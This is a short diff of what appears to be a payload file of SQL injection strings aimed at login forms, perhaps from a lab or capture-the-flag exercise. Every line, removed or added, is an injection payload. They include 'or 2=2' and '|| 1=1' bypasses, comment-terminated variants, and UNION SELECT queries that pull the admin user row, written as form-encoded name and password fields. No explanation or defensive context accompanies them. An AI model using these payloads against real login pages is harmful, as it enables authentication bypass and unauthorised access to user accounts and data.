@@ -1,4 +1,5 @@
-user: \' union select * from user limit 1,1 #
-user: \' or 2=2 limit 1,1#
-user: \' || 2=2 limit 1,1#
-user: \                                          pass:  or 2=2 limit 1,1 #
+name=guest&password=\' union select * from user where user="admin"#
+name=guest&password=guest\' or 2=2 limit 1,1#
+name=guest&password=guest\' || 1=1 limit 1,1#
+name=guest&password=guest\' || 1=1 limit 1,1-- annotation
+name=guest&password=guest\' union select 0,"test",0,1#
